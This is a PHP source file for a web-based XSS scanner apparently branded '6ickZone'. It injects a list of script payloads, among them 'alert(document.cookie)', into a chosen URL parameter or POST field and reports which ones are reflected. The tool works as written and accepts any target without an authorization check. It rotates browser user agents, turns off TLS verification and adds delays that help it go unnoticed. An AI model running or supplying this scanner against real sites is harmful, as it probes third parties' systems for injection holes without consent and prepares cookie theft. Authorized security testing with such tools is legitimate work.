<?php
error_reporting(0);
set_time_limit(0);

if (!extension_loaded('curl')) {
    die('<div style="color:red; font-family:monospace;">[ERROR] Enable cURL module in php.ini</div>');
}

$results = [];
$default_payloads = "<script>alert(1)</script>\n\" onmouseover=alert(1)\njavascript:alert(document.cookie)";

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['target'])) {
    $target_input = trim($_POST['target']);
    $post_data_input = trim($_POST['postdata'] ?? '');
    $method = $_POST['method'];
    $delay = intval($_POST['delay'] ?? 0);
    
    $user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
    ];

    if (!filter_var($target_input, FILTER_VALIDATE_URL)) {
        $error_msg = "Invalid URL Format.";
    } else {
        $target_url = $target_input;
        
        if (!empty($_POST['payloads'])) {
            $payloads = explode("\n", str_replace("\r", "", $_POST['payloads']));
            
            foreach ($payloads as $index => $p) {
                $p = trim($p);
                if (empty($p)) continue;
                
                // Anti-flood delay
                if ($index > 0 && $delay > 0) sleep($delay);

                $encoded_payload = urlencode($p);
                $final_url = $target_url;
                $final_post_data = $post_data_input;
                
                // Logic Replace FUZZ
                if ($method === 'GET') {
                    if (strpos($final_url, 'FUZZ') !== false) {
                        $final_url = str_replace('FUZZ', $encoded_payload, $final_url);
                    } else {
                        $final_url .= $encoded_payload;
                    }
                } else {
                    if (strpos($final_post_data, 'FUZZ') !== false) {
                        $final_post_data = str_replace('FUZZ', $p, $final_post_data);
                    }
                }

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $final_url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                curl_setopt($ch, CURLOPT_TIMEOUT, 15);
                curl_setopt($ch, CURLOPT_USERAGENT, $user_agents[array_rand($user_agents)]);

                if ($method === 'POST') {
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $final_post_data);
                }

                $startTime = microtime(true);
                $response = curl_exec($ch);
                $endTime = microtime(true);
                $latency = round(($endTime - $startTime) * 1000);

                $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $content_length = curl_getinfo($ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD);
                
                if ($content_length == -1 && $response) {
                    $content_length = strlen($response);
                }

                if (curl_errno($ch)) {
                    $results[] = [
                        'payload' => htmlspecialchars($p),
                        'status' => 'ERR',
                        'length' => 0,
                        'latency' => 0,
                        'vulnerable' => false,
                        'error' => curl_error($ch),
                        'url' => $final_url
                    ];
                } else {
                    // Detection Logic: Raw Payload Reflection
                    $is_vulnerable = (strpos($response, $p) !== false);
                    
                    $results[] = [
                        'payload' => htmlspecialchars($p),
                        'status' => $http_code,
                        'length' => $content_length,
                        'latency' => $latency,
                        'vulnerable' => $is_vulnerable,
                        'error' => null,
                        'url' => $final_url
                    ];
                }
                curl_close($ch);
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>6ickZone XSS Scanner // Web Based</title>
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=Roboto+Mono:wght@400;500&display=swap');

    :root {
        --bg-color: #0f172a; /* Slate 900 */
        --card-bg: #1e293b; /* Slate 800 */
        --input-bg: #334155; /* Slate 700 */
        --text-color: #f1f5f9;
        --accent-color: #38bdf8; /* Sky Blue */
        --danger-color: #f87171;
        --border-color: #475569;
    }

    body { 
        font-family: 'Inter', sans-serif; 
        background: var(--bg-color); 
        color: var(--text-color); 
        margin: 0; padding: 40px; 
    }
    
    code, textarea, input[type="text"] {
        font-family: 'Roboto Mono', monospace;
    }

    .container { max-width: 900px; margin: 0 auto; }

    .card { 
        background: var(--card-bg); 
        padding: 35px; 
        border-radius: 16px; 
        box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        margin-bottom: 25px;
        border: 1px solid rgba(255,255,255,0.05);
    }

    h2 { 
        margin-top: 0; 
        font-size: 1.25rem;
        font-weight: 600;
        color: #fff;
        border-bottom: 1px solid var(--border-color);
        padding-bottom: 20px;
        margin-bottom: 25px;
    }

    label { display: block; margin: 20px 0 8px; font-weight: 600; font-size: 0.9rem; color: #cbd5e1; }

    .input-group input, .input-group textarea, .input-group select {
        width: 100%; 
        background: var(--bg-color); 
        border: 1px solid var(--border-color);
        color: #fff; 
        padding: 12px 16px; 
        border-radius: 8px;
        box-sizing: border-box;
        font-size: 14px;
        transition: all 0.2s;
    }

    .input-group input:focus, .input-group textarea:focus { 
        outline: none; 
        border-color: var(--accent-color); 
        ring: 2px solid rgba(56, 189, 248, 0.2);
    }

    .btn-submit {
        background: var(--accent-color);
        color: #0f172a;
        border: none; 
        padding: 14px;
        font-weight: 600; 
        cursor: pointer; 
        width: 100%; 
        margin-top: 25px;
        border-radius: 8px;
        font-size: 1rem;
        transition: 0.2s;
    }

    .btn-submit:hover { background: #7dd3fc; }

    /* Table */
    .result-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 14px; }
    .result-table th { text-align: left; padding: 12px; color: #94a3b8; font-weight: 600; border-bottom: 1px solid var(--border-color); }
    .result-table td { padding: 14px 12px; border-bottom: 1px solid var(--border-color); color: #e2e8f0; }
    .result-table tr:last-child td { border-bottom: none; }

    /* Status */
    .vuln-found { color: var(--accent-color); background: rgba(56, 189, 248, 0.1); padding: 4px 8px; border-radius: 4px; font-size: 12px; }
    .vuln-safe { color: #64748b; }
    .status-200 { color: #4ade80; } /* Green-400 */
    .status-403 { color: var(--danger-color); }
    
    .helper-text { font-size: 0.85em; color: #64748b; margin-top: 6px; }
</style>
</head>
<body>

<div class="container">
    <div class="card">
        <h2>Target Configuration</h2>
        <form method="POST">
            <div style="display: flex; gap: 10px;">
                <div class="input-group" style="flex: 3;">
                    <label>Target URL:</label>
                    <input type="text" name="target" value="<?= isset($_POST['target']) ? htmlspecialchars($_POST['target']) : '' ?>" placeholder="http://target.com/page.php?q=FUZZ" required>
                </div>
                <div class="input-group" style="flex: 1;">
                    <label>Method:</label>
                    <select name="method">
                        <option value="GET" <?= (isset($_POST['method']) && $_POST['method'] == 'GET') ? 'selected' : '' ?>>GET</option>
                        <option value="POST" <?= (isset($_POST['method']) && $_POST['method'] == 'POST') ? 'selected' : '' ?>>POST</option>
                    </select>
                </div>
            </div>

            <div class="input-group">
                <label>POST Data (Optional):</label>
                <input type="text" name="postdata" value="<?= isset($_POST['postdata']) ? htmlspecialchars($_POST['postdata']) : '' ?>" placeholder="username=admin&comment=FUZZ">
                <div class="helper-text">Use <b>FUZZ</b> to mark injection point. Empty if GET.</div>
            </div>
            
            <div class="input-group">
                <label>Delay (sec):</label>
                <input type="number" name="delay" value="<?= isset($_POST['delay']) ? $_POST['delay'] : 0 ?>" min="0" max="10" style="width: 100px;">
            </div>
            
            <div class="input-group">
                <label>Payloads:</label>
                <textarea name="payloads" rows="8" spellcheck="false"><?= isset($_POST['payloads']) ? htmlspecialchars($_POST['payloads']) : $default_payloads ?></textarea>
            </div>
            
            <button type="submit" class="btn-submit">Start Scan</button>
        </form>
    </div>

    <?php if (!empty($results)): ?>
    <div class="card">
        <h2>Scan Results</h2>
        <table class="result-table">
            <thead>
                <tr>
                    <th width="10%">Status</th>
                    <th width="10%">Time</th>
                    <th width="10%">Length</th>
                    <th width="50%">Payload</th>
                    <th width="20%">Result</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($results as $res): 
                    $status_class = 'status-' . substr($res['status'], 0, 3);
                    if ($res['status'] >= 400) $status_class = 'status-403';
                    if ($res['status'] == 200) $status_class = 'status-200';
                ?>
                <tr>
                    <td class="<?= $status_class ?>"><?= $res['status'] ?></td>
                    <td><?= $res['latency'] ?> ms</td>
                    <td><?= $res['length'] ?> B</td>
                    <td>
                        <code><?= $res['payload'] ?></code>
                        <div class="helper-text">
                            <a href="<?= htmlspecialchars($res['url']) ?>" target="_blank" style="color:#444; text-decoration:none;">[Request]</a>
                        </div>
                    </td>
                    <td>
                        <?php if ($res['error']): ?>
                            <span style="color:orange">ERR</span>
                        <?php elseif ($res['vulnerable']): ?>
                            <span class="vuln-found">⚡ REFLECTED</span>
                        <?php else: ?>
                            <span class="vuln-safe">Clean</span>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <?php endif; ?>
</div>

</body>
</html>
